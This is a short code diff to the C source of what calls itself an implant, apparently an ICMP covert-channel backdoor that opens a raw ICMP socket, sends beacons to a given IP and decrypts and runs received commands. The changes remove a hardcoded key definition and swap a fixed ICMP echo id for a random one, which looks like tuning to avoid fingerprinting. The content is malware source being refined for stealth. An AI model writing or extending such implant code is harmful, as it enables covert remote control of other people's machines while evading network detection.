@@ -6,9 +6,6 @@
 #include "../include/implant.h"
 #include "../include/utils.h"
 
-#define KEY "thisisapassword"
-#define KEY_LENGTH 15
-
 // creates a raw ICMP socket and binds it
 int create_socket(void) {
     int sockfd;
@@ -27,7 +24,7 @@ size_t invoke_command(unsigned char *data, unsigned char *output) {
     FILE *ptr;
     char *command;
     size_t buffer_size, data_section_size = strlen((char *) data);
-    unsigned char *buffer = (unsigned char *) malloc(BUFFER_SIZE * sizeof(unsigned char)); // added 6 to prevent overflow?
+    unsigned char *buffer = (unsigned char *) malloc(BUFFER_SIZE * sizeof(unsigned char));
     CHECK_ALLOC(buffer);
 
     // decrypt the command
@@ -75,7 +72,7 @@ int send_beacon(int sockfd, char *dst_ip) {
     icmp = (struct icmphdr *) packet;
 	icmp->type = 8;
 	icmp->code = 8;
-	icmp->un.echo.id = 9001;
+	icmp->un.echo.id = RAND_ID;
     icmp->checksum = 0;
     icmp->checksum = cksum((unsigned short *) icmp, packet_size);
 
